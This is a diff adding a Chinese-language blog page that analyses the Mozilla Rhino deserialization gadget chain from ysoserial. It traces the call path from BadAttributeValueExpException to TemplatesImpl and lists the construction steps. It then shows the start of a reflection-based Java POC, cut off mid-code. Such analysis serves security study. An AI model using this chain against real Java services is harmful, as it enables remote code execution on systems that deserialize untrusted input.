@@ -1,0 +1,945 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/image/favicon-64x64-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/image/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/image/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/image/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="反序列化,Mozilla Rhino," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="闻道解惑" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="来源：香依香偎@闻道解惑 Mozilla Rhino 是一个完全使用 Java 语言编写的开源 JavaScript 引擎。ysoserial 中收录了 Rhino 的反序列化 Gadget，本篇文章就来分析一下这个 Gadget。 零、NativeError 的继承关系首先来看 org.mozilla.javascript.NativeError 类的继承关系。它继承自 IdScriptable">
+<meta name="keywords" content="反序列化,Mozilla Rhino">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Mozilla Rhino 反序列化漏洞 POC 分析">
+<meta property="og:url" content="http://www.yaowendao.com/2018/02/24/Mozilla Rhino反序列化漏洞POC分析/index.html">
+<meta property="og:site_name" content="闻道解惑">
+<meta property="og:description" content="来源：香依香偎@闻道解惑 Mozilla Rhino 是一个完全使用 Java 语言编写的开源 JavaScript 引擎。ysoserial 中收录了 Rhino 的反序列化 Gadget，本篇文章就来分析一下这个 Gadget。 零、NativeError 的继承关系首先来看 org.mozilla.javascript.NativeError 类的继承关系。它继承自 IdScriptable">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://www.yaowendao.com/image/00-class.png">
+<meta property="og:image" content="http://www.yaowendao.com/image/01-nativeerror.png">
+<meta property="og:image" content="http://www.yaowendao.com/image/02-js_toString.png">
+<meta property="og:image" content="http://www.yaowendao.com/image/03-getString.png">
+<meta property="og:image" content="http://www.yaowendao.com/image/04-ScriptableObject.getProperty.png">
+<meta property="og:image" content="http://www.yaowendao.com/image/05-IdScriptableObject.get.png">
+<meta property="og:image" content="http://www.yaowendao.com/image/06-ScriptableObject.get.png">
+<meta property="og:image" content="http://www.yaowendao.com/image/07-ScriptableObject.getImpl.png">
+<meta property="og:image" content="http://www.yaowendao.com/image/08-getImpl-2-branch.png">
+<meta property="og:image" content="http://www.yaowendao.com/image/09-transient-delegateTo.png">
+<meta property="og:image" content="http://www.yaowendao.com/image/10-nativeGetter.invoke.png">
+<meta property="og:image" content="http://www.yaowendao.com/image/11-getImpl-branch-2.png">
+<meta property="og:image" content="http://www.yaowendao.com/image/62-ScriptableObject-getterObj.png">
+<meta property="og:image" content="http://www.yaowendao.com/image/63-GetterSlot-getter.png">
+<meta property="og:image" content="http://www.yaowendao.com/image/64-GetterSlot-classes.png">
+<meta property="og:image" content="http://www.yaowendao.com/image/65-ScriptableObject-setGetterOrSetter.png">
+<meta property="og:image" content="http://www.yaowendao.com/image/12-Function-classes.png">
+<meta property="og:image" content="http://www.yaowendao.com/image/13-NativeJavaMethod-classes.png">
+<meta property="og:image" content="http://www.yaowendao.com/image/14-NativeJavaMethod.call.png">
+<meta property="og:image" content="http://www.yaowendao.com/image/15-MemberBox.invoke.png">
+<meta property="og:image" content="http://www.yaowendao.com/image/14-NativeJavaMethod.call.png">
+<meta property="og:image" content="http://www.yaowendao.com/image/16-NativeJavaMethod-methods.png">
+<meta property="og:image" content="http://www.yaowendao.com/image/61-NativeJavaMethod.methods.png">
+<meta property="og:image" content="http://www.yaowendao.com/image/15-MemberBox.invoke.png">
+<meta property="og:image" content="http://www.yaowendao.com/image/17-MemberBox-method.png">
+<meta property="og:image" content="http://www.yaowendao.com/image/18-MemberBox-memberObject.png">
+<meta property="og:image" content="http://www.yaowendao.com/image/19-MemberBox.readObject.png">
+<meta property="og:image" content="http://www.yaowendao.com/image/20-MemberBox.init.png">
+<meta property="og:image" content="http://www.yaowendao.com/image/21-MemberBox.readMember.png">
+<meta property="og:image" content="http://www.yaowendao.com/image/22-NativeJavaMethod-javaObject.png">
+<meta property="og:image" content="http://www.yaowendao.com/image/23-NativeJavaMethod.else.branch.png">
+<meta property="og:image" content="http://www.yaowendao.com/image/24-for-o-Wrapper.png">
+<meta property="og:image" content="http://www.yaowendao.com/image/25-Wrapper-classes.png">
+<meta property="og:image" content="http://www.yaowendao.com/image/26-NativeJavaObject-unwrap.png">
+<meta property="og:image" content="http://www.yaowendao.com/image/27-NativeJavaObject-readObject.png">
+<meta property="og:image" content="http://www.yaowendao.com/image/28-ScriptableObject-getPrototype.png">
+<meta property="og:image" content="http://www.yaowendao.com/image/29-ScriptableObject.prototypeObject.png">
+<meta property="og:image" content="http://www.yaowendao.com/image/30-NativeJavaMethod.args.png">
+<meta property="og:image" content="http://www.yaowendao.com/image/31-ScriptableObject.emptyArgs.png">
+<meta property="og:image" content="http://www.yaowendao.com/image/32-BadAttributeValueExpException-readObject.png">
+<meta property="og:image" content="http://www.yaowendao.com/image/33-Error-NativeError.png">
+<meta property="og:image" content="http://www.yaowendao.com/image/34-Reason-NativeError.png">
+<meta property="og:image" content="http://www.yaowendao.com/image/35-Solution-New-NativeError.png">
+<meta property="og:image" content="http://www.yaowendao.com/image/36-Error-Run-new-instance.png">
+<meta property="og:image" content="http://www.yaowendao.com/image/37-Error-Access-NativeError.png">
+<meta property="og:image" content="http://www.yaowendao.com/image/38-Solution-setAccessible.png">
+<meta property="og:image" content="http://www.yaowendao.com/image/39-Error-no-context.png">
+<meta property="og:image" content="http://www.yaowendao.com/image/40-Reason-no-context.png">
+<meta property="og:image" content="http://www.yaowendao.com/image/41-Reason-Context-null.png">
+<meta property="og:image" content="http://www.yaowendao.com/image/42-Context-enter.png">
+<meta property="og:image" content="http://www.yaowendao.com/image/43-Context-enter-2.png">
+<meta property="og:image" content="http://www.yaowendao.com/image/02-js_toString.png">
+<meta property="og:image" content="http://www.yaowendao.com/image/44-Error-no-context.png">
+<meta property="og:image" content="http://www.yaowendao.com/image/45-ScriptalbeObject-setGetterOrSetter.png">
+<meta property="og:image" content="http://www.yaowendao.com/image/40-Reason-no-context.png">
+<meta property="og:image" content="http://www.yaowendao.com/image/46-calc.png">
+<meta property="og:image" content="http://www.yaowendao.com/image/47-call-stack.png">
+<meta property="og:updated_time" content="2018-06-02T07:34:06.855Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Mozilla Rhino 反序列化漏洞 POC 分析">
+<meta name="twitter:description" content="来源：香依香偎@闻道解惑 Mozilla Rhino 是一个完全使用 Java 语言编写的开源 JavaScript 引擎。ysoserial 中收录了 Rhino 的反序列化 Gadget，本篇文章就来分析一下这个 Gadget。 零、NativeError 的继承关系首先来看 org.mozilla.javascript.NativeError 类的继承关系。它继承自 IdScriptable">
+<meta name="twitter:image" content="http://www.yaowendao.com/image/00-class.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"always","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://www.yaowendao.com/2018/02/24/Mozilla Rhino反序列化漏洞POC分析/"/>
+
+
+
+
+
+  <title>Mozilla Rhino 反序列化漏洞 POC 分析 | 闻道解惑</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">闻道解惑</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-sitemap">
+          <a href="/sitemap.xml" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br />
+            
+            站点地图
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://www.yaowendao.com/2018/02/24/Mozilla Rhino反序列化漏洞POC分析/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="香依香偎">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/image/0.jpeg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="闻道解惑">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Mozilla Rhino 反序列化漏洞 POC 分析</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-02-24T00:00:00+08:00">
+                2018-02-24
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>来源：<a href="https://mp.weixin.qq.com/s/qm3mS78r43IIOHgZ-6YyGw" target="_blank" rel="noopener">香依香偎@闻道解惑</a></p>
+<p><strong>Mozilla Rhino</strong> 是一个完全使用 Java 语言编写的开源 JavaScript 引擎。ysoserial 中收录了 Rhino 的反序列化 Gadget，本篇文章就来分析一下这个 Gadget。</p>
+<h2 id="零、NativeError-的继承关系"><a href="#零、NativeError-的继承关系" class="headerlink" title="零、NativeError 的继承关系"></a>零、NativeError 的继承关系</h2><p>首先来看 <code>org.mozilla.javascript.NativeError</code> 类的继承关系。它继承自 <code>IdScriptableObject</code>，后者继承自 <code>ScriptableObject</code>。而 <code>ScriptableObject</code> 实现了 <code>Scriptable</code> 接口和 <code>Serializable</code> 接口。因此，<code>NativeError</code> 可以进行序列化和反序列化操作。</p>
+<p> <img src="/image/00-class.png" alt="NativeError.class"> </p>
+<h2 id="一、分析"><a href="#一、分析" class="headerlink" title="一、分析"></a>一、分析</h2><p><strong>1、</strong> 首先，反序列化攻击的入口在 <code>NativeError</code> 的 <code>toString()</code> 函数。</p>
+<p> <img src="/image/01-nativeerror.png" alt="NativeError.toString"> </p>
+<p><code>toString()</code> 中调用了 <code>js_toString()</code> 函数，传入参数为 <code>NativeError</code> 的 this 对象。看下<code>js_toString()</code> 。</p>
+<p> <img src="/image/02-js_toString.png" alt="NativeError.js_toString"> </p>
+<p><code>js_toString()</code> 调用了两次 <code>getString()</code> 函数，传入的参数是 <code>NativeError</code> 对象和字符串 name/message，继续跟进。</p>
+<p> <img src="/image/03-getString.png" alt="NativeError.getString"> </p>
+<p><code>getString()</code> 中调用的是父类 <code>ScriptableObject</code> 的 <code>getProperty()</code> 函数，入参没有变化。跟进去看看。</p>
+<p> <img src="/image/04-ScriptableObject.getProperty.png" alt="ScriptableObject.getProperty"> </p>
+<p>其中调用的是 <code>Scriptable</code> 接口的 <code>get()</code> 函数。这个 <code>get()</code> 的实现在 <code>IdScriptableObject</code> 类。</p>
+<p> <img src="/image/05-IdScriptableObject.get.png" alt="IdScriptableObject.get"> </p>
+<p><code>IdScriptableObject.get()</code> 最后调用的是父类 <code>ScriptableObject</code> 的 <code>get()</code> 函数，再次回到 <code>ScriptableObject</code> 类。</p>
+<p> <img src="/image/06-ScriptableObject.get.png" alt="ScriptableObject.get"> </p>
+<p>继续跟进 <code>getImpl()</code> 函数。</p>
+<p> <img src="/image/07-ScriptableObject.getImpl.png" alt="ScriptableObject.getImpl"> </p>
+<p>其中的关键在于 2007 行到 2026 行的这部分。先看 2009 行到 2020 行的第一个分支。</p>
+<p> <img src="/image/08-getImpl-2-branch.png" alt="getImpl-branches.png"> </p>
+<p>这个分支中有 <code>nativeGetter.invoke()</code> 的调用，看上去有戏。但有一个问题在于，<code>nativeGetter.delegateTo</code> 是 <code>transient</code> 变量，在反序列化过程中无法赋值。</p>
+<p> <img src="/image/09-transient-delegateTo.png" alt="transient-delegateTo"> </p>
+<p>这会导致 2013 行 <code>if (nativeError.delegateTo == null)</code> 的判断恒真，<code>getterThis</code> 就被赋值为最初的 <code>NativeError</code> 对象。这就导致 2020 行的 <code>nativeGetter.invoke()</code> 无法调用我们期望的目标对象的函数，只能调用静态函数或者 <code>NativeError</code> 类的内置函数。这当然不是我们期望的结果。</p>
+<p> <img src="/image/10-nativeGetter.invoke.png" alt="nativeGetter.invoke"> </p>
+<p>再来看 2021 行到 2026 行的 <code>else</code> 分支。</p>
+<p> <img src="/image/11-getImpl-branch-2.png" alt="getImpl-else-branch"> </p>
+<p>这个分支中需要将 <code>getterObj</code> 设置为 <code>Function</code> 对象，并最终调用 <code>Function</code> 的 <code>call()</code> 函数。先看看 <code>getterObj</code> 如何赋值。</p>
+<p><img src="/image/62-ScriptableObject-getterObj.png" alt="ScriptableObject-getterObj"></p>
+<p>通过 <code>GetterSlot</code> 的 <code>getter</code>。<code>GetterSlot</code> 是 <code>ScriptableObject</code> 的内部类，支持序列化。</p>
+<p><img src="/image/63-GetterSlot-getter.png" alt="GetterSlot-getter"></p>
+<p><img src="/image/64-GetterSlot-classes.png" alt="GetterSlot-classes"></p>
+<p><code>GetterSlot.getter</code> 可以通过 <code>ScriptableObject.setGetterOrSetter()</code> 来进行赋值。</p>
+<p><img src="/image/65-ScriptableObject-setGetterOrSetter.png" alt="ScriptableObject-setGetterOrSetter"></p>
+<p>那么 <code>getterObj</code> 要赋值成 <code>Function</code> 的哪个对象呢？<code>Function</code> 是个接口，看下它的实现类。</p>
+<p><img src="/image/12-Function-classes.png" alt="Function-classes"></p>
+<p>我们选择 <code>NativeJavaMethod</code> 类。这个类继承自 <code>BaseFunction</code>，后者同样继承自 <code>IdScriptableObject</code>，因此同样可以进行序列化和反序列化处理。</p>
+<p><img src="/image/13-NativeJavaMethod-classes.png" alt="NativeJavaMethod-classes"></p>
+<p><code>NativeJavaMethod.call()</code> 函数挺长，翻一翻会发现在 247 行调用了 <code>meth.invoke(javaObject, args)</code>。</p>
+<p><img src="/image/14-NativeJavaMethod.call.png" alt="NativeJavaMethod.call"></p>
+<p>这个 <code>invoke()</code> 的调用，其实是 <code>MemberBox.invoke()</code> 函数，其中直接调用了我们熟悉的 <code>method.invoke()</code> 函数。</p>
+<p><img src="/image/15-MemberBox.invoke.png" alt="MemberBox.invoke"></p>
+<p>看起来很有希望。为了能成功调用到我们期望的目标函数，我们需要关注 <code>NativeJavaMethod.call()</code> 中 <code>meth.invoke(javaObject, args)</code> 里的三个变量：<code>meth</code>、<code>javaObject</code>和<code>args</code>。</p>
+<p><img src="/image/14-NativeJavaMethod.call.png" alt="NativeJavaMethod.call"></p>
+<p>一个一个来，先看 <code>meth</code>。</p>
+<p><strong>2、</strong><code>meth</code> 的值来自类的成员变量 <code>methods</code>，通过 <code>findFunction()</code> 查找到索引 <code>index</code>。 </p>
+<p><img src="/image/16-NativeJavaMethod-methods.png" alt="NativeJavaMethod.methods"></p>
+<p>成员变量 <code>methods</code> 是 <code>MemberBox</code> 类的对象数组，本身可以通过反序列化赋值。</p>
+<p><img src="/image/61-NativeJavaMethod.methods.png" alt="NativeJavaMethod.methods"></p>
+<p>至于 <code>methods</code> 的内容要设置成什么样，来看下 <code>MemberBox.invoke()</code> 函数。其中 <code>method</code> 来自 <code>method()</code> 函数，而后者是直接返回了 <code>memberObject</code> 变量。</p>
+<p><img src="/image/15-MemberBox.invoke.png" alt="MemberBox.invoke"></p>
+<p><img src="/image/17-MemberBox-method.png" alt="MemberBox-method"></p>
+<p><code>MemberBox.memberObject</code> 是个 transient 变量，要怎么赋值呢？</p>
+<p><img src="/image/18-MemberBox-memberObject.png" alt="MemberBox-memberObject"></p>
+<p>答案就在 <code>MemberBox.readObject()</code> 中。这里先通过 <code>readMember()</code> 得到了 member 对象，再通过 <code>init()</code> 函数将 <code>member</code> 赋值给 <code>memberObject</code>。</p>
+<p><img src="/image/19-MemberBox.readObject.png" alt="MemberBox.readObject"></p>
+<p><img src="/image/20-MemberBox.init.png" alt="MemberBox.init"></p>
+<p>继续跟进 <code>readMember()</code> 函数，就是一个反序列化的实现。因此，通过反序列化给 <code>memberObject</code>的赋值，不存在问题。</p>
+<p><img src="/image/21-MemberBox.readMember.png" alt="MemberBox.readMember"></p>
+<p>也就是说，我们可以通过反序列化给 <code>meth</code> 赋值为期望的目标函数。</p>
+<p><strong>结论</strong></p>
+<p>设置 <code>NativeJavaMethod.call()</code> 中的 <code>meth</code> 需要：</p>
+<ul>
+<li>构造 <code>MemberBox</code> 对象 m</li>
+<li>设置 m 的成员变量 <code>memberObject</code> 为目标函数</li>
+<li>构造 <code>NativeJavaMethod</code> 对象 n</li>
+<li>设置 n 的成员变量 <code>methods</code> 的 0 号元素为 m</li>
+</ul>
+<p><strong>3、</strong> javaObject 涉及的代码，都在 <code>NativeJavaMethod.call()</code> 的 222~247 行。</p>
+<p><img src="/image/22-NativeJavaMethod-javaObject.png" alt="NativeJavaMethod-javaObject"></p>
+<p>关键的部分就是 225~242 行的 <code>else</code> 分支里。</p>
+<p><img src="/image/23-NativeJavaMethod.else.branch.png" alt="NativeJavaMethod.else.branch"></p>
+<p>如果要把 <code>javaObject</code> 赋值为我们期望的对象，就是要在 235 行完成这个赋值。但是这里有一个问题：我们知道 <code>thisObj</code> 就是 <code>NativeError</code> 对象，同理 <code>o</code> 也是。但 <code>NativeError</code> 没有实现 <code>Wrapper</code> 接口，这样一来 234 行的判断条件 <code>if (o instanceof Wrapper)</code> 就不能满足了。</p>
+<p><img src="/image/24-for-o-Wrapper.png" alt="for-o-Wrapper"></p>
+<p>转机在于，这个判断身处循环之中，240 行的 <code>o = o.getPrototype()</code> 给了我们希望。查看一下 <code>Wrapper</code> 的实现类。</p>
+<p><img src="/image/25-Wrapper-classes.png" alt="Wrapper-classes"></p>
+<p>看下 <code>NativeJavaObject</code> 的 <code>unwrap()</code> 函数，直接返回了 <code>NativeJavaObject.javaObject</code> 成员变量。</p>
+<p><img src="/image/26-NativeJavaObject-unwrap.png" alt="NativeJavaObject-unwrap"></p>
+<p>而 <code>NativeJavaObject.javaObject</code> 成员变量可以通过反序列化的 <code>readObject()</code> 函数直接赋值。</p>
+<p><img src="/image/27-NativeJavaObject-readObject.png" alt="NativeJavaObject-readObject"></p>
+<p>也就是说，如果我们让 <code>NativeError</code> 对象的 <code>getPrototype()</code> 返回特定的 <code>NativeJavaObject</code> 对象，就可以完成 <code>javaObject</code> 的赋值。看看 <code>getPrototype()</code> 的实现，在 <code>ScriptableObject</code> 类中。</p>
+<p><img src="/image/28-ScriptableObject-getPrototype.png" alt="ScriptableObject-getPrototype"></p>
+<p>这个 <code>prototypeObject</code> 来自 ScriptableObject 的成员变量，可以通过反序列化赋值。 </p>
+<p><img src="/image/29-ScriptableObject.prototypeObject.png" alt="ScriptableObject.prototypeObject"></p>
+<p><strong>结论</strong></p>
+<p>设置 <code>NativeJavaMethod.call()</code> 中的 <code>javaObject</code> 需要：</p>
+<ul>
+<li>构造 <code>NativeJavaObject</code> 对象 o</li>
+<li>设置 o 的成员变量 <code>javaObject</code> 为目标对象</li>
+<li>构造 <code>NativeError</code> 对象 e</li>
+<li>设置 e 的成员变量 <code>prototypeObject</code> 为 o </li>
+</ul>
+<p><strong>4、</strong> 最后看一下 <code>args</code>。<code>args</code>来自入参，其实就是调用者传入的 <code>ScriptRuntime.emptyArgs</code>。</p>
+<p><img src="/image/30-NativeJavaMethod.args.png" alt="NativeJavaMethod.args"></p>
+<p><img src="/image/31-ScriptableObject.emptyArgs.png" alt="ScriptableObject.emptyArgs"></p>
+<p>这就决定我们要寻找的目标函数，必须是一个<strong>无参函数</strong>。</p>
+<p><strong>5、</strong> 再回到开头，通常反序列化的入口都是 <code>readObject()</code> 函数，而文章开头说 <code>NativeError</code> 的反序列化入口在 <code>toString()</code> 函数。怎么才能从 <code>readObject()</code> 入口转到 <code>NativeError.toString()</code> 呢？</p>
+<p>答案就在 JDK 中的 <code>BadAttributeValueExpException</code> 类的 <code>readObject()</code> 函数。</p>
+<p><img src="/image/32-BadAttributeValueExpException-readObject.png" alt="BadAttributeValueExpException-readObject"></p>
+<p>也就是说，只要将 <code>BadAttributeValueExpException</code> 的 <code>val</code> 设置为 <code>NativeError</code> 对象，就可以在反序列化的过程中调用 <code>NativeError.toString()</code> 了。</p>
+<p><strong>6、结论</strong> </p>
+<p>如果要完成反序列化POC，需要：</p>
+<ul>
+<li>构造 <code>MemberBox</code> 对象 m</li>
+<li>设置 m 的成员变量 <code>memberObject</code> 为目标函数</li>
+<li>构造 <code>NativeJavaMethod</code> 对象 n</li>
+<li>设置 n 的成员变量 <code>methods</code> 的 0 号元素为 m</li>
+<li>构造 <code>NativeJavaObject</code> 对象 o</li>
+<li>设置 o 的成员变量 <code>javaObject</code> 为目标对象</li>
+<li>构造 <code>NativeError</code> 对象 a</li>
+<li>设置 a 的成员变量 <code>prototypeObject</code> 为 o </li>
+<li>通过 a 的 <code>setGetterOrSetter()</code> 函数，设置 a 的 <code>getter</code> 属性为对象 n</li>
+<li>构造 <code>BadAttributeValueExpException</code> 对象 b</li>
+<li>设置 b 的成员变量 <code>val</code> 为 <code>NativeError</code> 对象 a</li>
+</ul>
+<p>前面说过，需要寻找的目标函数，应当是一个无参函数。同时，这个无参函数所属的目标类，还得是实现了 <code>Serializable</code> 接口、支持序列化和反序列化的类。</p>
+<p>因此，首先想到的就是，使用 <code>TemplatesImpl</code> 类作为目标类，使用它的 <code>getOutputProperties()</code> 作为目标函数。</p>
+<h2 id="二、填坑"><a href="#二、填坑" class="headerlink" title="二、填坑"></a>二、填坑</h2><p>完成了上述分析，我们开始写POC。途中暗坑无数，逐一填之。</p>
+<h3 id="1、NativeError-无法实例化"><a href="#1、NativeError-无法实例化" class="headerlink" title="1、NativeError 无法实例化"></a>1、<code>NativeError</code> 无法实例化</h3><p>声明 <code>NativeError</code> 对象，直接报错：<code>The type NativeError is not visible</code>。</p>
+<p><img src="/image/33-Error-NativeError.png" alt="Error-NativeError"></p>
+<p><strong>报错原因：</strong></p>
+<p> <code>NativeError</code> 类不是 <code>public</code>，不能直接引用。</p>
+<p><img src="/image/34-Reason-NativeError.png" alt="Reason-NativeError"></p>
+<p><strong>解决方案：</strong></p>
+<p>通过反射，实例化 <code>NativeError</code> 对象。</p>
+<p><img src="/image/35-Solution-New-NativeError.png" alt="Solution-New-NativeError"></p>
+<h3 id="2、反射实例化的-NativeError-运行失败"><a href="#2、反射实例化的-NativeError-运行失败" class="headerlink" title="2、反射实例化的 NativeError 运行失败"></a>2、反射实例化的 <code>NativeError</code> 运行失败</h3><p>运行这段代码：</p>
+<p><img src="/image/36-Error-Run-new-instance.png" alt="Error-Run-new-instance"></p>
+<p>报错 “ Class com.xiang.rhinotest.RhinoPoc can not access a member of class org.mozilla.javascript.NativeError with modifiers “” ”</p>
+<p><img src="/image/37-Error-Access-NativeError.png" alt="Error-Access-NativeError"></p>
+<p><strong>报错原因：</strong></p>
+<p><code>NativeError</code> 没有提供默认的public 无参构造函数，无法直接调用 newInstance()。</p>
+<p><strong>解决方案：</strong></p>
+<p>通过反射设置构造函数为 public，再进行调用。</p>
+<p><img src="/image/38-Solution-setAccessible.png" alt="Solution-setAccessible"></p>
+<p>反射在 ysoserial 中被大量的使用，原因也就在此。</p>
+<h3 id="3、执行POC失败：No-Context"><a href="#3、执行POC失败：No-Context" class="headerlink" title="3、执行POC失败：No Context"></a>3、执行POC失败：No Context</h3><p>按照“分析”部分的结论，结合大量的反射调用，完成POC如下。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> Object <span class="title">generate_Object</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">//构造 NativeError 对象 a</span></span><br><span class="line">    Object nativeError;</span><br><span class="line">    &#123;</span><br><span class="line">        Class&lt;?&gt; cls = Class.forName(<span class="string">"org.mozilla.javascript.NativeError"</span>);</span><br><span class="line">        Constructor&lt;?&gt; cons = cls.getDeclaredConstructor();</span><br><span class="line">        cons.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        nativeError = cons.newInstance();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//构造 NativeJavaObject 对象 o</span></span><br><span class="line">    <span class="comment">//设置 o 的成员变量 javaObject 为目标对象</span></span><br><span class="line">    <span class="comment">//设置 a 的成员变量 prototypeObject 为 o</span></span><br><span class="line">    TemplatesImpl templatesImpl = TemplatesImplGadget.get();</span><br><span class="line">    &#123;</span><br><span class="line">        Context context = Context.enter();</span><br><span class="line">        NativeObject scriptableObject = (NativeObject) context.initStandardObjects();</span><br><span class="line">        NativeJavaObject nativeJavaObject = <span class="keyword">new</span> NativeJavaObject(scriptableObject, templatesImpl, TemplatesImpl.class);</span><br><span class="line">        Method method = nativeError.getClass().getMethod(<span class="string">"setPrototype"</span>, <span class="keyword">new</span> Class&lt;?&gt;[]&#123;Scriptable.class&#125;);</span><br><span class="line">        method.invoke(nativeError, <span class="keyword">new</span> Object[]&#123;nativeJavaObject&#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//构造 MemberBox 对象 m</span></span><br><span class="line">    <span class="comment">//设置 m 的成员变量 memberObject 为目标函数</span></span><br><span class="line">    <span class="comment">//构造 NativeJavaMethod 对象 n</span></span><br><span class="line">    <span class="comment">//设置 n 的成员变量 methods 的 0 号元素为 m   </span></span><br><span class="line">    <span class="comment">//通过 a 的 setGetterOrSetter() 函数，设置 a 的 getter 属性为对象 n</span></span><br><span class="line">    Method getOutputProperties = templatesImpl.getClass().getMethod(<span class="string">"getOutputProperties"</span>, <span class="keyword">new</span> Class&lt;?&gt;[<span class="number">0</span>]);</span><br><span class="line">    &#123; </span><br><span class="line">        NativeJavaMethod 